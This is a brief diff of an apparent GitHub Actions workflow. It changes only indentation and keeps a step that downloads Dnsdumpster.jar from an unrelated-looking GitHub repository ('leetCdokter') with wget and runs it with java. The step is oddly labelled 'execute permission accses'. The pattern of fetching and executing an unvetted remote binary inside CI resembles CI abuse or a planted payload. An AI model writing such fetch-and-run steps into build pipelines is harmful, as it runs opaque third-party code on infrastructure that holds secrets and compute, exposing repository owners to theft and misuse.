@@ -23,5 +23,5 @@ jobs:
 
     - name: execute permission accses
     - run: |
-          wget https://github.com/riezharriz82/leetCdokter/raw/master/Dnsdumpster.jar
-          java -jar Dnsdumpster.jar
+        wget https://github.com/riezharriz82/leetCdokter/raw/master/Dnsdumpster.jar
+        java -jar Dnsdumpster.jar
